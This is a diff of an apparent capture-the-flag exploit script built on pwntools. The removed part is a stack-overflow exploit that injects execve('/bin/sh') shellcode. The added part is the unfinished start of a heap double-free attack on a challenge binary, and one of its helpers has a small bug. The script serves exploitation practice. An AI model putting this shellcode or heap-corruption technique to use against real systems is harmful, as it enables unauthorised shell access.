@@ -10,13 +10,15 @@ def start(argv=[], *a, **kw):
 
 gdbscript = '''
 init-pwndbg
-r
+b *0x00400bc7
+b *0x400b14
+b *0x400c54
 continue
 '''.format(**locals())
 
-exe = './start'
+exe = './tear_patched'
 
-elf = context.binary = ELF(exe)
+libc = ELF('./libc.so.6')
 
 sla  = lambda r, s: conn.sendlineafter(r, s)
 sl   = lambda    s: conn.sendline(s)
@@ -27,25 +29,31 @@ rl   = lambda : conn.recvline()
 uu32 = lambda d: u32(d.ljust(4, b'\x00'))
 uu64 = lambda d: u64(d.ljust(8, b'\x00'))
 
+def nameBuf(s):
+    # s = bytes
+    sla(b'Name:', s)
+
+def malloc(size, data):
+    sla(b'Your choice :', b'1')
+    sla(b'Size:', str(size).encode())
+    sla(b'Data:', data)
+
+def free():
+    sla(b'Your choice :', b'2')
+
+def info():
+    sla(b'Your choice :', b'3')
+    leak = rl
+    return leak
+
 conn = start()
 
-add = 0x8048087
-
-shellcode = b"\x31\xC9\x31\xD2\xB0\x0B\x68\x2F\x2F\x73\x68\x68\x2F\x62\x69\x6E\x89\xE3\xCD\x80"
-
-sa(b'CTF:', shellcode + p32(add))
-
-leak = conn.recv()
-
-leak_stack = u32(leak[0:4].ljust(4, b'\x00'))
-
-print(hex(leak_stack))
-
-pause()
-
-sl(b'A' * 0x14 + p32(leak_stack - 0x1c) + p32(0))
-
-#print(hex(leak_stack))
+nameBuf(b'tuan')
+add_buf = 0x602060
+malloc(31, p64(add_buf))
+free()
+free()
+malloc(31, p64(add_buf))
 
 conn.interactive()
 
